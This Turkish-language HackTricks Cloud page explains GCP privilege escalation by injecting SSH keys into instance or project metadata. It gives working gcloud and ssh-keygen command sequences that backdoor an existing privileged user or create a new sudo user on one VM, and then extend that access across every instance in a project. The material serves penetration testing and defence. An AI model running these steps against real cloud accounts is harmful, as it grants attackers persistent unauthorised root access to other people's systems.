# GCP - Özel SSH Metadata Ekleme

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

## Metadata'yi Düzenleme <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Bir örneğin metadata'sının değiştirilmesi, **saldırganın gerekli izinleri elde etmesi durumunda önemli güvenlik risklerine yol açabilir**.

### **Özel Metadata'ya SSH Anahtarlarının Eklenmesi**

GCP'de, **Linux sistemleri** genellikle [Google Compute Engine için Python Linux Konuk Ortamı](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts) tarafından betikler çalıştırır. Bu işlemin kritik bir bileşeni, [hesaplar daemonu](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)dir, bu da **yetkilendirilmiş SSH genel anahtarlarına yapılan güncellemeleri düzenli olarak kontrol etmek üzere** örnek metadata uç noktasını kontrol eder.

Bu nedenle, bir saldırgan özel metadata'yı değiştirebiliyorsa, daemonun yeni bir genel anahtar bulmasını sağlayabilir, bu da işlenir ve **yerel sisteme entegre edilir**. Anahtar, mevcut bir kullanıcının `~/.ssh/authorized_keys` dosyasına eklenir veya anahtarın formatına bağlı olarak `sudo` ayrıcalıklarına sahip yeni bir kullanıcı oluşturulabilir. Ve saldırgan, ana bilgisayarı ele geçirebilir.

### **Mevcut ayrıcalıklı kullanıcıya SSH anahtarı ekleme**

1. **Örnekteki SSH Anahtarlarını İnceleyin:**
- Mevcut SSH anahtarlarını bulmak için örneği ve metadata'sını tanımlamak için komutu çalıştırın. İlgili bölüm, `metadata` altında, özellikle `ssh-keys` anahtarının altında olacaktır.
```bash
gcloud compute instances describe [ÖRNEK] --zone [BÖLGE]
```
- SSH anahtarlarının formatına dikkat edin: kullanıcı adı, iki nokta üst üste kullanılarak ayrılmış şekilde anahtardan önce gelir.

2. **SSH Anahtar Metadata'sı İçin Bir Metin Dosyası Hazırlayın:**
- Kullanıcı adlarının ve bunlara karşılık gelen SSH anahtarlarının ayrıntılarını `meta.txt` adlı bir metin dosyasına kaydedin. Bu, yeni eklenen anahtarları korumak için önemlidir.

3. **Hedef Kullanıcı İçin Yeni Bir SSH Anahtarı Oluşturun (`alice` örneğinde):**
- Hedef kullanıcı adıyla eşleşen bir yorum alanına (`-C`) sahip yeni bir SSH anahtarı oluşturmak için `ssh-keygen` komutunu kullanın.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- Yeni genel anahtarı, örneğin metadata'sında bulunan formata benzeyerek `meta.txt`'ye ekleyin.

4. **Örneğin SSH Anahtar Metadata'sını Güncelleyin:**
- Güncellenmiş SSH anahtar metadata'sını örneğe `gcloud compute instances add-metadata` komutunu kullanarak uygulayın.
```bash
gcloud compute instances add-metadata [ÖRNEK] --metadata-from-file ssh-keys=meta.txt
```

5. **Yeni SSH Anahtarı Kullanarak Örneğe Erişin:**
- Yeni anahtarı kullanarak örneğe SSH ile bağlanın ve hedef kullanıcı bağlamında kabuğa erişin (`alice` örneğinde).
```bash
ssh -i ./key alice@localhost
sudo id
``` 

### **Yeni ayrıcalıklı bir kullanıcı oluşturun ve bir SSH anahtarı ekleyin**

Eğer ilginç bir kullanıcı bulunamazsa, `sudo` ayrıcalıkları verilecek yeni bir kullanıcı oluşturulabilir:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### Proje Düzeyinde SSH Anahtarları <a href="#sshing-around" id="sshing-around"></a>

Bulut ortamında **proje düzeyinde SSH erişimini genişletmek mümkündür**. Bu yaklaşım, proje genelinde SSH anahtarlarını uygulayarak projenin içindeki herhangi bir örneğe SSH erişimine izin verir, eğer özel olarak proje genelinde SSH anahtarları engellenmemişse. İşte özetlenmiş bir rehber:

1. **Proje Düzeyinde SSH Anahtarları Uygulama:**
- `gcloud compute project-info add-metadata` komutunu kullanarak `meta.txt` dosyasındaki SSH anahtarlarını projenin meta verilerine ekleyin. Bu işlem, SSH anahtarlarının projedeki tüm VM'lerde tanınmasını sağlar, bir VM'in "Proje genelinde SSH anahtarlarını engelle" seçeneği etkinleştirilmediği sürece.
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **Proje Genelinde Anahtarlar Kullanarak Örneklerde SSH Yapma:**
- Proje genelinde SSH anahtarları mevcut olduğunda, projenin içindeki herhangi bir örneğe SSH yapabilirsiniz. Proje genelinde anahtarları engellemeyen örnekler, SSH anahtarını kabul ederek erişime izin verecektir.
- Bir örneğe doğrudan SSH yapmanın bir yolu, `gcloud compute ssh [ÖRNEK]` komutunu kullanmaktır. Bu komut, mevcut kullanıcı adınızı ve projenin düzeyinde ayarlanmış SSH anahtarlarını kullanarak erişim denemek için kullanılır.


# Referanslar
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
